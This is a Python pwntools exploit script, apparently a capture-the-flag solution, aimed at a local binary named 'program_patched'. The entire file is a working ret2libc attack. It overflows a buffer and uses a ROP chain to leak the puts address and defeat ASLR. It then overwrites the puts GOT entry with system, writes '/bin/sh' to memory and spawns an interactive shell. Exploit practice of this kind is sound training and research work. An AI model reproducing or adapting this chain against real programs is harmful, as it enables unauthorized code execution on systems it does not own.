from pwn import * 

binary = "./program_patched"

elf = ELF(binary)
libc = ELF("./libc.so.6")

context.binary = elf 
p = process(binary)
s = '''
b * bare+66
'''
# f"b* {pop_rdi}" + s
gdb.attach(p,s)
p.recvuntil(b"What is your name?\n")

pop_rdi_ret = 0x00000000004007d3
writable_addr = 0x601000 +0x500
payload = flat(
    b'A'* 0x10, # up to rbp
    b'B' * 8, # saved rbp

    # 1. defeat ASLR by leaking libc function addresses - puts
    # 2. write puts to sys using gets 
    # 3. write /bin/sh to a writable location
    # 4. pop that to system
    # wow the payload is super long but its okay fgets doesn't get limited
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    # how about the ASLR offset here? just leaked in the section above lol 
    #system pauses here to wait for input, before that we calculate the libc base addr?
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['gets'], # enter system address,  

    pop_rdi_ret,
    writable_addr, 
    elf.plt['gets'],

    pop_rdi_ret,
    writable_addr,
    elf.plt['puts']
)

p.sendline(payload)

puts = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
print(hex(puts))

print(hex(libc.sym['puts']))
libc.address = puts - libc.sym['puts']
print(hex(libc.address))

p.sendline(p64(libc.sym['system']))
p.sendline(b'/bin/sh\x00')





p.interactive()